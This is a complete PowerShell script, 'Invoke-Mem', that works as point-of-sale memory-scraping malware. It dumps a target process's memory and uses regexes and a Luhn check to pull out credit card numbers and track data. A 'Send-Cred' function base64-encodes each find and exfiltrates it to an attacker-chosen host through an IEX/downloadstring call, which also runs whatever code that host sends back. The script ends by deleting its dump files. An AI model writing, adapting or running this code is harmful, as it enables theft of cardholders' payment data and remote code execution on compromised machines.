﻿function Invoke-Mem {
[CmdletBinding()]
Param (

    [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
    [String]
    $Proc,

    [Parameter(Position = 1)]
    [ValidateScript({ Test-Path $_ })]
    [String]
    $DumpFilePath = $PWD,

    [Parameter(Mandatory=$false)]
    [String]$LogHost,

    [Parameter(Mandatory=$false)]
    [string[]]$User,

    [Parameter(Mandatory=$false)]
    [Switch]$NumsOnly = $False,
    
    [Parameter(Mandatory=$false)]
    [Switch]$Logging,

    [Parameter(Mandatory=$false)]
    [String]$Bin
)
# sourced from the PowerSploit project: https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1
function Out-Minidump
{

    BEGIN
    {
        $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
        $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
        $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
        $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
        $MiniDumpWithFullMemory = [UInt32] 2
    }

    PROCESS
    {
        $Process = $p
        $ProcessId = $Process.Id
        $ProcessName = $Process.Name
        $ProcessHandle = $Process.Handle
        $ProcessFileName = "$($ProcessName)_$($ProcessId).dmp"

        $ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName

        $FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)

        $Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
                                                     $ProcessId,
                                                     $FileStream.SafeFileHandle,
                                                     $MiniDumpWithFullMemory,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero))

        $FileStream.Close()

        if (-not $Result)
        {
            $Exception = New-Object ComponentModel.Win32Exception
            $ExceptionMessage = "$($Exception.Message) ($($ProcessName):$($ProcessId))"

            # Remove any partially written dump files. For example, a partial dump will be written
            # in the case when 32-bit PowerShell tries to dump a 64-bit process.
            Remove-Item $ProcessDumpPath -ErrorAction SilentlyContinue

            throw $ExceptionMessage
        }
        else
        {
            Get-ChildItem $ProcessDumpPath
        }
    }

    END {}
}

# luhn test code sourced from: http://scriptolog.blogspot.com/2008/01/powershell-luhn-validation.html
function Test-LuhnNumber([int[]]$digits){
 
    [int]$sum=0
    [bool]$alt=$false

    for($i = $digits.length - 1; $i -ge 0; $i--){
        if($alt){
            $digits[$i] *= 2
            if($digits[$i] -gt 9) { $digits[$i] -= 9 }
        }

        $sum += $digits[$i]
        $alt = !$alt
    }
    
    return ($sum % 10) -eq 0
}

function Write-Log ($logstring, $color = "White")
{
    $LogFile = "mem_output.txt"
    $timestamp = Get-Date
    if ($Logging) 
		{ Add-Content $LogFile -value "[$timestamp] - $logstring" }
    else 
		{ Write-Host "[$timestamp] - $logstring" -ForegroundColor $color }
}

function Send-Cred($cred) {
    if ($LogHost) {
        $cred = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cred.Value))
        IEX (new-object net.webclient).downloadstring("http://$LogHost/$cred") -ErrorAction SilentlyContinue
    }
}

function main {

    # save mem dumps to present working directory
    $dest = $PWD
    $cardnumbers = @()
    
    Write-Log "Starting Scraper"
    while (1) {
        if ($User) {
            # we use wmi b/c its a v2 safe way of getting process owner
            $process = (Get-WmiObject win32_process | where{$_.ProcessName -match $Proc})
            $procs = @()
            foreach ($p in $process) {
                foreach ($u in $User) {
                    if ($p.getowner().User -eq $u) {
                        $p = Get-Process -Id $p.ProcessId
                        $procs += $p
                    }
                }
            }
        }
        else {
            $Procs = Get-Process $Proc -ErrorAction SilentlyContinue #| Select -Property Responding
        }
        if ($Procs) {
            Write-Log "Target process is running. Dumping memory..."
            foreach ($p in $Procs) {
                Out-Minidump -DumpFilePath $dest
            }
            $dumps = Get-ChildItem -Path $dest -Filter *.dmp | select FullName
            foreach ($d in $dumps) {
                Write-Log "Scraping memory dump: $($d.FullName)"
                if ($NumsOnly) {
                    # find plain nums - WARNING: could result in a lot of false postives      
                    $nums = (Select-String -Path $d.FullName -Pattern "(4[0-9]{15}|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})" | foreach {$_.matches} | Select-String -NotMatch "(\d)\1{5,}")
                }
                else {
                    # we default to finding track data  
                    $nums = (Select-String -Path $d.FullName -Pattern "\%B[\d]{16}[\^\w\s\/\d]+\?" | foreach {$_.matches})       
                }
        
                foreach ($td in $nums) {
                    if ($cardnumbers -notcontains $td.Value) {
                        if ($NumsOnly) {
                            if ($Bin) {
                                if ($td -match $Bin) {
                                    Write-Log "CARD NUM: $td" "green"
                                    Send-Cred($td)
                                }
                            }
                            else {
                                # Luhn test our result before logging
                                if (Test-LuhnNumber([int[]][string[]][char[]]($td.Value))) {
                                    Write-Log "POSSIBLE CARD NUM: $td" "green"
                                    Send-Cred($td)
                                }
                            }
                        }
                        else {
                            Write-Log "TRACK DATA: $td" "green"
                            Send-Cred($td)
                        }
                    }
                    $cardnumbers += $td.Value
                }
                Write-Log "removing dump file: $($d.FullName)"
                Remove-Item $d.FullName
            }
        }
        else {
            Write-Log "Target process not running"
        }
        sleep 10
    }
}
main 
}
